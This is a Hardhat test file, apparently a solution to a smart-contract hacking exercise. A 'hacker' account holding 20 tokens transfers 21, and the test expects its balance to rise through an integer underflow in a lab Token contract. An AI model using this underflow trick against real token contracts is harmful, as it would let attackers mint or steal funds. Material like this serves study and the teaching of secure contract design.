import { use, expect } from 'chai';
import { ethers, waffle } from 'hardhat';
import { Token } from '../dist/types';

use(waffle.solidity);

describe('Token', () => {
  let deployer: any, hacker: any;
  let contract: Token;

  before(async () => {
    [deployer, hacker] = await ethers.getSigners();

    contract = await (await ethers.getContractFactory('Token'))
      .deploy(10000) as Token;
    await contract.deployed();

    await (await contract.transfer(hacker.address, 20)).wait();
  });

  it('interaction', async () => {
    // before
    expect(await contract.balanceOf(hacker.address)).to.eq(20);

    // hack
    await contract.connect(hacker).transfer(deployer.address, 21);
    expect(await contract.balanceOf(hacker.address)).to.gt(ethers.BigNumber.from(20));
  });
});
